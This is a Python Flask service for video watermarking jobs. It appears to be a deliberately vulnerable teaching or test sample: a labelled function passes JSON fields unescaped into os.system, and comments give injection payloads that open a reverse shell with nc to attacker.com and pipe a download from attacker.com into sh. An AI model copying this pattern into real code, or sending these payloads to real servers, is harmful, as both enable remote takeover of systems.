import os
import uuid
import sqlite3
import logging
import threading
from datetime import datetime
from flask import Flask, request, jsonify

# Configure logging for the Media Transcoding API
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - MediaAPI - %(levelname)s - %(message)s'
)
logger = logging.getLogger("VideoProcessingService")

app = Flask(__name__)
DB_FILE = "transcode_jobs.db"

def init_job_database():
    """Initializes the SQLite database for tracking asynchronous video processing jobs."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE jobs (
            job_id TEXT PRIMARY KEY,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            video_url TEXT NOT NULL,
            watermark_text TEXT,
            status TEXT NOT NULL,
            completion_time DATETIME
        )
    ''')
    
    # Insert some dummy historical jobs
    cursor.executemany('''
        INSERT INTO jobs (job_id, video_url, watermark_text, status)
        VALUES (?, ?, ?, ?)
    ''', [
        ('job_a1b2c3', 'https://storage.local/vid1.mp4', 'Draft', 'COMPLETED'),
        ('job_x9y8z7', 'https://storage.local/vid2.mp4', 'Confidential', 'FAILED')
    ])
    
    conn.commit()
    conn.close()
    logger.info("Job tracking database initialized.")

def update_job_status(job_id: str, status: str):
    """Updates the status of a transcoding job in the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        if status in ['COMPLETED', 'FAILED']:
            cursor.execute(
                "UPDATE jobs SET status = ?, completion_time = ? WHERE job_id = ?",
                (status, datetime.now().isoformat(), job_id)
            )
        else:
            cursor.execute(
                "UPDATE jobs SET status = ? WHERE job_id = ?",
                (status, job_id)
            )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error updating job {job_id}: {e}")

def execute_ffmpeg_watermark(video_url: str, watermark_text: str, output_path: str, job_id: str) -> bool:
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: Flask HTTP POST JSON Payload (watermark_text / video_url field)
    """
    logger.info(f"[{job_id}] Starting FFMPEG watermarking process.")
    
    # Vulnerability: Direct string interpolation of HTTP JSON fields into a shell command.
    # The 'watermark_text' and 'video_url' are extracted directly from the unvalidated POST payload.
    # os.system executes the string via the system shell (/bin/sh).
    command = f"ffmpeg -i {video_url} -vf drawtext=text='{watermark_text}':fontcolor=white:fontsize=24 -c:a copy {output_path}"
    
    try:
        logger.debug(f"[{job_id}] Executing media processing command: {command}")
        
        # An attacker can send a crafted HTTP POST request where watermark_text contains shell metacharacters:
        # e.g., {"video_url": "http://example.com/a.mp4", "watermark_text": "test':fontcolor=white; nc -e /bin/sh attacker.com 1337; #"}
        # The single quote breaks out of the FFMPEG argument, and the semicolon starts a new shell command.
        
        exit_code = os.system(command)
        
        if exit_code == 0:
            logger.info(f"[{job_id}] Media processing completed successfully.")
            return True
        else:
            logger.warning(f"[{job_id}] FFMPEG returned non-zero exit code: {exit_code}")
            return False
            
    except Exception as e:
        logger.error(f"[{job_id}] Failed to execute FFMPEG command: {e}")
        return False

def background_worker(job_id: str, video_url: str, watermark_text: str):
    """Background thread to process the video without blocking the HTTP response."""
    update_job_status(job_id, "PROCESSING")
    
    output_dir = "/tmp/transcoded_media"
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(output_dir, f"{job_id}.mp4")
    
    # Pass the untrusted fields from the JSON payload to the vulnerable function
    success = execute_ffmpeg_watermark(video_url, watermark_text, output_path, job_id)
    
    final_status = "COMPLETED" if success else "FAILED"
    update_job_status(job_id, final_status)

@app.route('/api/v1/jobs/watermark', methods=['POST'])
def create_watermark_job():
    """REST API endpoint to submit a new video watermarking job."""
    if not request.is_json:
        return jsonify({"error": "Request payload must be JSON"}), 400
        
    payload = request.get_json()
    video_url = payload.get("video_url")
    watermark_text = payload.get("watermark_text")
    
    if not video_url or not watermark_text:
        return jsonify({"error": "Missing required fields: 'video_url', 'watermark_text'"}), 400
        
    job_id = f"job_{uuid.uuid4().hex[:8]}"
    
    try:
        # Persist the initial job state
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO jobs (job_id, video_url, watermark_text, status) VALUES (?, ?, ?, ?)",
            (job_id, video_url, watermark_text, 'QUEUED')
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to create job record: {e}")
        return jsonify({"error": "Internal database error"}), 500
        
    # Dispatch the background processing task
    worker_thread = threading.Thread(
        target=background_worker, 
        args=(job_id, video_url, watermark_text)
    )
    worker_thread.start()
    
    logger.info(f"Accepted new watermarking job: {job_id}")
    return jsonify({
        "message": "Job accepted",
        "job_id": job_id,
        "status": "QUEUED"
    }), 202

@app.route('/api/v1/jobs/<job_id>', methods=['GET'])
def get_job_status(job_id):
    """Retrieves the current status of a submitted job."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT status, completion_time FROM jobs WHERE job_id = ?", (job_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                "job_id": job_id,
                "status": row[0],
                "completion_time": row[1]
            }), 200
        else:
            return jsonify({"error": "Job not found"}), 404
            
    except sqlite3.Error:
        return jsonify({"error": "Internal database error"}), 500

if __name__ == "__main__":
    init_job_database()
    
    # Example Malicious Trigger via cURL:
    # curl -X POST http://127.0.0.1:5000/api/v1/jobs/watermark \
    #      -H "Content-Type: application/json" \
    #      -d '{"video_url": "http://example.com/vid.mp4", "watermark_text": "Confidential'\''; curl http://attacker.com/malware | sh; #"}'
    
    logger.info("Starting Media Transcoding API on port 5000")
    app.run(host="0.0.0.0", port=5000, threaded=True)
